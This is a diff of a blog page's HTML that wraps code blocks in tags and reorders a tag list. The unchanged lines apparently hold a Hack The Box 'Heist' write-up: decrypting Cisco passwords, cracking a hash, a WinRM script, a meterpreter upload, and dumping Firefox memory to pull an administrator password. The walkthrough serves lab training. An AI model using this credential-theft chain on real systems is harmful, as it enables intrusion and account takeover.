@@ -119,7 +119,7 @@ service, a meterpreter, a tentative of Lazagne and procdump.</p>
 </div>
 <h1 id="recon">Recon</h1>
 <p>We start with an nmap scan.</p>
-<div class="highlight"><pre><span class="code-line"><span></span># Nmap 7.80 scan initiated Wed Nov  6 15:29:09 2019 as: nmap -p- -sSV -oA nmap 10.10.10.149</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Wed Nov  6 15:29:09 2019 as: nmap -p- -sSV -oA nmap 10.10.10.149</span>
 <span class="code-line">Nmap scan report for 10.10.10.149</span>
 <span class="code-line">Host is up (0.23s latency).</span>
 <span class="code-line">Not shown: 65530 filtered ports</span>
@@ -133,7 +133,7 @@ service, a meterpreter, a tentative of Lazagne and procdump.</p>
 <span class="code-line"></span>
 <span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
 <span class="code-line"># Nmap done at Wed Nov  6 15:34:10 2019 -- 1 IP address (1 host up) scanned in 301.46 seconds</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h2 id="port-80-http">port 80: HTTP</h2>
@@ -150,7 +150,7 @@ Then we see a conversation between an user and the support about a CISCO router
 configuration.</p>
 <p><img alt="configuration cisco" src="/media/2019.12/heist_1.png"></p>
 <p>The router configuration is the following:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>version 12.2</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>version 12.2</span>
 <span class="code-line">no service pad</span>
 <span class="code-line">service password-encryption</span>
 <span class="code-line">!</span>
@@ -191,25 +191,25 @@ configuration.</p>
 <span class="code-line">session-timeout 600</span>
 <span class="code-line">authorization exec SSH</span>
 <span class="code-line">transport input ssh</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We use <a href="https://github.com/theevilbit/ciscot7">a cisco type 7 decrypter</a> to get
 the <code>rout3r</code> and <code>admin</code> passwords.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>python ciscot7.py -d -p 0242114B0E143F015F5D1E161713</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python ciscot7.py -d -p 0242114B0E143F015F5D1E161713</span>
 <span class="code-line">Decrypted password: $uperP@ssword</span>
 <span class="code-line">python ciscot7.py -d -p 02375012182C1A1D751618034F36415408</span>
 <span class="code-line">Decrypted password: Q4)sJu\Y8qz*A3?d</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>For the hashed password we use john with rockyou:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>john hash -w=~/tools/password_lists/rockyou.txt</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>john hash -w=~/tools/password_lists/rockyou.txt</span>
 <span class="code-line">Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])</span>
 <span class="code-line">Will run 4 OpenMP threads</span>
 <span class="code-line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
 <span class="code-line">stealth1agent    (?)</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We now have three potential users as well as three potential passwords. The
@@ -224,7 +224,7 @@ users:
 <p>We want to connect using the WinRM service. We can use
 <a href="https://github.com/Hackplayers/evil-winrm">evil winrm</a> as well as a simple
 ruby script:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><span class="nb">require</span> <span class="s1">&#39;winrm&#39;</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="nb">require</span> <span class="s1">&#39;winrm&#39;</span></span>
 <span class="code-line"></span>
 <span class="code-line"><span class="n">conn</span> <span class="o">=</span> <span class="no">WinRM</span><span class="o">::</span><span class="no">Connection</span><span class="o">.</span><span class="n">new</span><span class="p">(</span></span>
 <span class="code-line">  <span class="ss">endpoint</span><span class="p">:</span> <span class="s1">&#39;http://10.10.10.149:5985/wsman&#39;</span><span class="p">,</span></span>
@@ -245,7 +245,7 @@ ruby script:</p>
 <span class="code-line">    <span class="k">end</span></span>
 <span class="code-line">    <span class="nb">puts</span> <span class="s2">&quot;Exiting with code </span><span class="si">#{</span><span class="n">output</span><span class="o">.</span><span class="n">exitcode</span><span class="si">}</span><span class="s2">&quot;</span></span>
 <span class="code-line"><span class="k">end</span></span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>Trying all the possible combination won't give up a shell. We need more
@@ -253,7 +253,7 @@ enumeration. We launch
 <a href="https://github.com/SecureAuthCorp/impacket/">impacket's lookupsid</a> using the
 different user/password combinations. One is working with the Hazard user and
 the <code>stealth1agent</code> password:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>python lookupsid.py Hazard:stealth1agent@10.10.10.149</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python lookupsid.py Hazard:stealth1agent@10.10.10.149</span>
 <span class="code-line">Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation</span>
 <span class="code-line"></span>
 <span class="code-line">[*] Brute forcing SIDs at 10.10.10.149</span>
@@ -268,14 +268,14 @@ the <code>stealth1agent</code> password:</p>
 <span class="code-line">1009: SUPPORTDESK\support (SidTypeUser)</span>
 <span class="code-line">1012: SUPPORTDESK\Chase (SidTypeUser)</span>
 <span class="code-line">1013: SUPPORTDESK\Jason (SidTypeUser)</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We have more users now! We can eliminate the <code>stealth1agent</code> password as this is
 Hazard's password.
 A few combination later using winrm, we discover that the user Chase use the
 <code>Q4)sJu\Y8qz*A3?d</code> password. We have a shell and the user flag:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>ruby winrm.rb</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ruby winrm.rb</span>
 <span class="code-line">PS &gt; whoami</span>
 <span class="code-line">supportdesk\chase</span>
 <span class="code-line">PS &gt; dir ../Desktop</span>
@@ -299,18 +299,18 @@ A few combination later using winrm, we discover that the user Chase use the
 <span class="code-line"></span>
 <span class="code-line">Done:</span>
 <span class="code-line">1. Restricted access for guest user.</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We can upload a meterpreter (generated with msfvenom) using
 <a href="https://github.com/Hackplayers/evil-winrm">evil winrm</a></p>
-<div class="highlight"><pre><span class="code-line"><span></span>evil-winrm  -i 10.10.10.149 -u ^Case -p &#39;Q4)sJu\Y8qz*A3?d&#39;</span>
-</pre></div>
+<div class="highlight"><pre><span class="code-line"><span></span><code>evil-winrm  -i 10.10.10.149 -u ^Case -p &#39;Q4)sJu\Y8qz*A3?d&#39;</span>
+<span class="code-line"></code></pre></div>
 
 
 <p>The meterpreter allow us to easy enumerate the box. Let us take a look at the
 running process:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>meterpreter &gt; ps</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>meterpreter &gt; ps</span>
 <span class="code-line"></span>
 <span class="code-line">Process List</span>
 <span class="code-line">============</span>
@@ -431,7 +431,7 @@ running process:</p>
 <span class="code-line">6940  612   svchost.exe                                                </span>
 <span class="code-line">6948  6672  php-cgi.exe                                                </span>
 <span class="code-line">6988  6852  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>Our Chase user is running a Firefox Browser. The idea is to see if there is
@@ -440,7 +440,7 @@ credentials stored in the browser's password manager. For that we will use
 <h2 id="lazagne">Lazagne</h2>
 <p>We upload the Lazagne executable using the meterpreter. Then using a shell we
 launch LaZagne with the <code>browsers</code> parameter.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>meterpreter &gt; shell</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>meterpreter &gt; shell</span>
 <span class="code-line">Process 3468 created.</span>
 <span class="code-line">Channel 5 created.</span>
 <span class="code-line">Microsoft Windows [Version 10.0.17763.437]</span>
@@ -462,7 +462,7 @@ launch LaZagne with the <code>browsers</code> parameter.</p>
 <span class="code-line">For more information launch it again with the -v option</span>
 <span class="code-line"></span>
 <span class="code-line">elapsed time = 0.0</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We did not found any password in the browser's password storage. Let us see what
@@ -471,7 +471,7 @@ is the process memory.</p>
 <p>We upload procdump.exe from
 <a href="https://docs.microsoft.com/en-us/sysinternals/">Systinternals</a> and dump the
 Firefox process memory before downloading the dump on our machine.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>meterpreter &gt; upload procdump.exe 06.exe</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>meterpreter &gt; upload procdump.exe 06.exe</span>
 <span class="code-line">[*] uploading  : procdump.exe -&gt; 06.exe</span>
 <span class="code-line">[*] Uploaded 467.19 KiB of 467.19 KiB (100.0%): procdump.exe -&gt; 06.exe</span>
 <span class="code-line">[*] uploaded   : procdump.exe -&gt; 06.exe</span>
@@ -495,20 +495,20 @@ Firefox process memory before downloading the dump on our machine.</p>
 <span class="code-line">[*] Downloaded 3.00 MiB of 286.62 MiB (1.05%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span>
 <span class="code-line">[*] Downloaded 4.00 MiB of 286.62 MiB (1.4%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span>
 <span class="code-line">[*] Downloaded 5.00 MiB of 286.62 MiB (1.74%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We then <code>grep</code> in the dump for some password.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>strings firefox_191106_223459.dmp | grep -i password | grep admin -i</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>strings firefox_191106_223459.dmp | grep -i password | grep admin -i</span>
 <span class="code-line">MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=</span>
 <span class="code-line">RG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=</span>
 <span class="code-line">MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We can then use the login and password either to connect to the support website
 or to the server using the <code>administrator</code> account.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>evil-winrm  -i 10.10.10.149 -u administrator -p &#39;4dD!5}x/re8]FBuZ&#39;</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>evil-winrm  -i 10.10.10.149 -u administrator -p &#39;4dD!5}x/re8]FBuZ&#39;</span>
 <span class="code-line"></span>
 <span class="code-line">Evil-WinRM shell v1.8</span>
 <span class="code-line"></span>
@@ -516,7 +516,7 @@ or to the server using the <code>administrator</code> account.</p>
 <span class="code-line"></span>
 <span class="code-line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../Desktop/root.txt</span>
 <span class="code-line">50dfa&lt;redacted&gt;</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h1 id="wrapping-up">Wrapping up</h1>
@@ -610,139 +610,52 @@ or something similar.</p>
 
     <ul>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/screen.html">screen</a>
+              <a href="https://maggick.fr/tag/suid.html">SUID</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/security.html">security</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/vault.html">vault</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/hash.html">hash</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/htb.html">HTB</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/ctf.html">ctf</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/cve.html">cve</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
+              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/api.html">api</a>
             </li>
             <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/misc.html">misc</a>
+              <a href="https://maggick.fr/tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/procdump.html">procdump</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+              <a href="https://maggick.fr/tag/rop.html">ROP</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/drupal.html">drupal</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/server.html">server</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/git.html">git</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/programming.html">programming</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/leak.html">leak</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/devops.html">devops</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/smb.html">smb</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/suid.html">SUID</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/mail.html">mail</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/blog.html">blog</a>
@@ -751,40 +664,127 @@ or something similar.</p>
               <a href="https://maggick.fr/tag/code-review.html">code review</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/python.html">python</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/rop.html">ROP</a>
+              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/windows.html">windows</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/leak.html">leak</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/hash.html">hash</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/waf.html">WAF</a>
             </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/screen.html">screen</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mail.html">mail</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/python.html">python</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/security.html">security</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/server.html">server</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/smb.html">smb</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/cve.html">cve</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/ctf.html">ctf</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
             </li>
     </ul>
 </section>
